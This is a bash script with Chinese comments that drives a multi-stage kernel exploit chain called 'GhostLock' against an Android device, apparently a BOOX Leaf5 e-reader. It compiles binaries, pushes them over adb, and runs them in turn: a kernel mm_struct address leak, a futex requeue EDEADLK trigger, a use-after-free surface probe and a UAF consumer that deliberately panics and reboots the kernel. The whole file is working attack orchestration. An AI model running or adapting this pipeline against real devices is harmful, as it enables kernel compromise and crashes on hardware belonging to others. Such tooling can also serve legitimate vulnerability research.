#!/usr/bin/env bash
# run_leaf5.sh — Leaf5 GhostLock 流水线一键执行（编译 → 推送 → 跑）
#
#   ./run_leaf5.sh build      # 只编译
#   ./run_leaf5.sh push       # 只推送
#   ./run_leaf5.sh leak       # S02 内核地址泄漏（KSNITCH_COLLISIONS=2）
#   ./run_leaf5.sh edeadlk    # S04 GhostLock 触发（期望 errno=35）
#   ./run_leaf5.sh surface    # #38 设备面触达基线
#   ./run_leaf5.sh panic      # S05 真 UAF + consumer（会让设备 kernel panic 重启）
#   ./run_leaf5.sh all        # build + push + leak + edeadlk + surface（不含 panic）
#
# 两个 Windows 坑：
#   1) 远端 /data/local/tmp 必须关掉 MSYS 路径转换（MSYS_NO_PATHCONV=1）
#   2) 本机路径给 adb.exe / clang.exe 必须转成 Windows 形式（cygpath -m）
set -uo pipefail

export MSYS_NO_PATHCONV=1
export MSYS2_ARG_CONV_EXCL='*'
ADB="${ADB:-/c/Users/thelu/AppData/Local/Android/Sdk/platform-tools/adb}"
export PATH="$(dirname "$ADB"):$PATH"

REPO="${REPO:-/e/BOOX/leaf5-ghostlock}"
LOGDIR="${LOGDIR:-/e/BOOX/logs}"
R=/data/local/tmp
T=$R/exploit/aarch64/tests
S04=$R/stages/S04
S05=$R/stages/S05

B_MMLEAK="$REPO/out/exploit/aarch64/tests/test_mm_leak"
B_FUTEX="$REPO/out/exploit/aarch64/tests/test_futex_hash"
B_EDEADLK="$REPO/out/stages/S04-ghostlock-trigger/arm64/ghostlock_edeadlk_detect"
B_SURFACE="$REPO/out/stages/S05-stack-overwrite/routes/10-ghostlock-true-uaf/probes/arm64/slotb_surface_reach"
B_PANIC="$REPO/out/stages/S05-stack-overwrite/routes/10-ghostlock-true-uaf/probes/arm64/ghostlock_uaf_reclaim_consumer"

mkdir -p "$LOGDIR"
# 本机路径 → Windows 形式
w() { cygpath -m "$1"; }

die() { echo "[-] $*" >&2; exit 1; }

gate() {
  local dev
  dev=$("$ADB" devices | awk 'NR>1 && $2=="device"{print $1; exit}')
  [ -n "$dev" ] || die "无已授权设备（屏幕上有授权弹窗就点允许）"
  echo "[*] device=$dev"
  "$ADB" shell 'cat /proc/version' | tee "$LOGDIR/runtime_version.txt"
  grep -q '#38' "$LOGDIR/runtime_version.txt" \
    || echo "[!] 内核不是 #38 —— 本仓库偏移对不上，别继续"
}

build() { /e/BOOX/build_leaf5.sh all || die "编译失败"; }

push() {
  gate
  local f
  for f in "$B_MMLEAK" "$B_FUTEX" "$B_EDEADLK" "$B_SURFACE" "$B_PANIC"; do
    [ -f "$f" ] || die "缺产物: $f（先跑 build）"
  done
  "$ADB" shell "mkdir -p $T $S04 $S05" || die "建目录失败"
  "$ADB" push "$(w "$B_MMLEAK")"  "$T/"   || die push
  "$ADB" push "$(w "$B_FUTEX")"   "$T/"   || die push
  "$ADB" push "$(w "$B_EDEADLK")" "$S04/" || die push
  "$ADB" push "$(w "$B_SURFACE")" "$S05/" || die push
  "$ADB" push "$(w "$B_PANIC")"   "$S05/" || die push
  "$ADB" shell "chmod 755 $T/* $S04/* $S05/*"
  "$ADB" shell "ls -l $T $S04 $S05"
}

leak() {
  echo "===== S02 mm_struct leak (KSNITCH_COLLISIONS=2) ====="
  "$ADB" shell "cd $T && KSNITCH_COLLISIONS=2 ./test_mm_leak" | tee "$LOGDIR/s02_mm_leak.txt"
  if grep -q 'FOUND mm_struct' "$LOGDIR/s02_mm_leak.txt"; then
    echo "[+] 泄漏成功: $(grep 'FOUND' "$LOGDIR/s02_mm_leak.txt")"
  else
    echo "[-] 本轮未命中，重跑一次（仓库记录 5/5）"
  fi
}

edeadlk() {
  echo "===== S04 GhostLock EDEADLK ====="
  "$ADB" shell "cd $S04 && ./ghostlock_edeadlk_detect" | tee "$LOGDIR/s04_edeadlk.txt"
  if grep -q 'requeue_errno=35' "$LOGDIR/s04_edeadlk.txt"; then
    echo "[+] 真触发边: EDEADLK(35)"
  else
    echo "[-] 未到 EDEADLK 边"
  fi
}

surface() {
  echo "===== slot_b surface reach ====="
  "$ADB" shell "cd $S05 && ./slotb_surface_reach" | tee "$LOGDIR/s05_surface.txt"
}

panic() {
  echo "[!] 该探针会让内核 panic 并重启设备（单次可控解引用，不写盘）"
  "$ADB" shell "cd $S05 && ./ghostlock_uaf_reclaim_consumer" | tee "$LOGDIR/s05_uaf_panic.txt" || true
  sleep 25
  "$ADB" wait-for-device
  echo "[*] 设备已回来: boot_completed=$("$ADB" shell getprop sys.boot_completed | tr -d '\r')"
  "$ADB" shell "dmesg | grep -iE 'kernel_panic|Unable to handle|Internal error|BUG:' | tail -30" \
    | tee "$LOGDIR/s05_panic_dmesg.txt" || true
}

case "${1:-all}" in
  build)   build ;;
  push)    push ;;
  leak)    leak ;;
  edeadlk) edeadlk ;;
  surface) surface ;;
  panic)   panic ;;
  all)     build && push && leak && edeadlk && surface ;;
  *)       echo "usage: $0 {build|push|leak|edeadlk|surface|panic|all}"; exit 1 ;;
esac
